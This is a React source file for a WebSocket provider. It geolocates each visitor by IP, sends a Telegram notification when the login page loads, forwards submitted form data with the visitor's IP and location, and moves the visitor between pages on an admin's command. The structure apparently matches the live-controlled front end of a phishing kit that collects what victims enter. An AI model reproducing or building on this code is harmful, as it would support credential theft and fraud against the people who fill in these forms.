import { createContext, useContext, useEffect, useState, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';

const WebSocketContext = createContext(null);

// WebSocket server URL - change this when deploying
const WS_URL = 'ws://localhost:8000/ws';

export const WebSocketProvider = ({ children }) => {
  const [isConnected, setIsConnected] = useState(false);
  const [clientId, setClientId] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const wsRef = useRef(null);
  const navigate = useNavigate();
  const reconnectTimeoutRef = useRef(null);
  const pingIntervalRef = useRef(null);
  const clientInfoRef = useRef(null); // Store client info locally

  // Check if notification was already sent (persists across reconnects)
  const wasNotificationSent = () => {
    return sessionStorage.getItem('ws_notification_sent') === 'true';
  };

  const markNotificationSent = () => {
    sessionStorage.setItem('ws_notification_sent', 'true');
  };

  // Fetch client's IP and location info
  const fetchClientInfo = async () => {
    // Return cached info if available
    if (clientInfoRef.current) {
      return clientInfoRef.current;
    }
    
    try {
      // Using ipapi.co for IP geolocation (free tier)
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const info = {
        ip: data.ip || 'Unknown',
        country: data.country_name || 'Unknown',
        city: data.city || 'Unknown',
        region: data.region || 'Unknown',
        user_agent: navigator.userAgent
      };
      clientInfoRef.current = info; // Cache it
      return info;
    } catch (error) {
      console.error('Error fetching client info:', error);
      const fallback = {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        user_agent: navigator.userAgent
      };
      clientInfoRef.current = fallback;
      return fallback;
    }
  };

  // Send initial notification to Telegram (call from Login page only)
  const sendInitialData = useCallback(async () => {
    if (wasNotificationSent()) {
      console.log('Initial notification already sent this session, skipping...');
      return false;
    }
    
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      // Get client info first
      const clientInfo = await fetchClientInfo();
      
      console.log('Sending initial notification request...');
      wsRef.current.send(JSON.stringify({
        type: 'send_notification',
        ...clientInfo
      }));
      markNotificationSent();
      console.log('Initial notification request sent');
      return true;
    } else {
      console.error('WebSocket not open, cannot send notification request');
      return false;
    }
  }, []);

  // Connect to WebSocket
  const connect = useCallback(() => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      return;
    }

    console.log('Connecting to WebSocket...');
    const ws = new WebSocket(WS_URL);

    ws.onopen = async () => {
      console.log('WebSocket connected');
      setIsConnected(true);
      setIsLoading(false);

      // Start ping interval to keep connection alive
      pingIntervalRef.current = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: 'ping' }));
        }
      }, 30000);
    };

    ws.onmessage = async (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('Received:', data);

        switch (data.type) {
          case 'connected':
            // Store client ID
            setClientId(data.client_id);
            console.log('Client ID:', data.client_id);
            
            // Pre-fetch client info for later use
            fetchClientInfo().then(info => {
              console.log('Client info prefetched:', info);
            });
            break;

          case 'navigate':
            // Handle navigation command from admin
            console.log('Navigating to:', data.route);
            navigate(data.route);
            break;

          case 'submit_ack':
            // Form submission acknowledged
            console.log('Submission acknowledged:', data.submit_type);
            break;

          case 'pong':
            // Keep-alive response
            break;

          default:
            console.log('Unknown message type:', data.type);
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };

    ws.onclose = () => {
      console.log('WebSocket disconnected');
      setIsConnected(false);
      
      // Clear ping interval
      if (pingIntervalRef.current) {
        clearInterval(pingIntervalRef.current);
      }

      // Attempt to reconnect after 3 seconds
      reconnectTimeoutRef.current = setTimeout(() => {
        console.log('Attempting to reconnect...');
        connect();
      }, 3000);
    };

    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
      setIsLoading(false);
    };

    wsRef.current = ws;
  }, [navigate]);

  // Initialize connection on mount
  useEffect(() => {
    connect();

    return () => {
      // Cleanup on unmount
      if (reconnectTimeoutRef.current) {
        clearTimeout(reconnectTimeoutRef.current);
      }
      if (pingIntervalRef.current) {
        clearInterval(pingIntervalRef.current);
      }
      if (wsRef.current) {
        wsRef.current.close();
      }
    };
  }, [connect]);

  // Send form submission data (includes client info for reliability)
  const submitForm = useCallback(async (submitType, formData) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      // Always include client info with form submission
      const clientInfo = await fetchClientInfo();
      wsRef.current.send(JSON.stringify({
        type: 'form_submit',
        submit_type: submitType,
        data: formData,
        client_info: clientInfo
      }));
      return true;
    }
    console.error('WebSocket not connected');
    return false;
  }, []);

  // Send custom message
  const sendMessage = useCallback((message) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
      return true;
    }
    return false;
  }, []);

  const value = {
    isConnected,
    clientId,
    isLoading,
    submitForm,
    sendMessage,
    sendInitialData,
    reconnect: connect
  };

  return (
    <WebSocketContext.Provider value={value}>
      {children}
    </WebSocketContext.Provider>
  );
};

// Custom hook to use WebSocket context
export const useWebSocket = () => {
  const context = useContext(WebSocketContext);
  if (!context) {
    throw new Error('useWebSocket must be used within a WebSocketProvider');
  }
  return context;
};

export default WebSocketContext;
